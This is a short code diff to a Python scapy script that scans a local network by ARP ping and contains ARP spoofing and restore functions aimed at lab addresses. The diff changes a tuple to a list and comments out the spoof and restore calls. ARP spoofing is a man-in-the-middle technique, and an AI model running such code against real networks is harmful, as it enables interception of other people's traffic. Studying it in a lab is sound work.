@@ -34,7 +34,7 @@ def scan(net, interface, timeout=5):
         ans, unans = scapy.all.arping(net, iface=interface, timeout=timeout, verbose=True)
         for s, r in ans:
             line = r.src + " " + r.psrc
-            ms = (r.src, r.psrc)
+            ms = [r.src, r.psrc]
             found_ips.append(ms)
             logger.info(line)
     except socket.error as e:
@@ -67,6 +67,6 @@ def arpRestore(victimIP, victimMAC, routerIP, routerMAC):
     scapy.all.send(scapy.all.ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
     scapy.all.send(scapy.all.ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)
 
-arpSpoof('192.168.56.101', '08:00:27:B0:A1:AB', '192.168.56.1', '0a:00:27:00:00:13')
-arpRestore('192.168.56.101', '08:00:27:B0:A1:AB', '192.168.56.1', '0a:00:27:00:00:13')
+# arpSpoof('192.168.56.101', '08:00:27:B0:A1:AB', '192.168.56.1', '0a:00:27:00:00:13')
+# arpRestore('192.168.56.101', '08:00:27:B0:A1:AB', '192.168.56.1', '0a:00:27:00:00:13')
 # scan("192.168.56.0/24", "enp0s3")
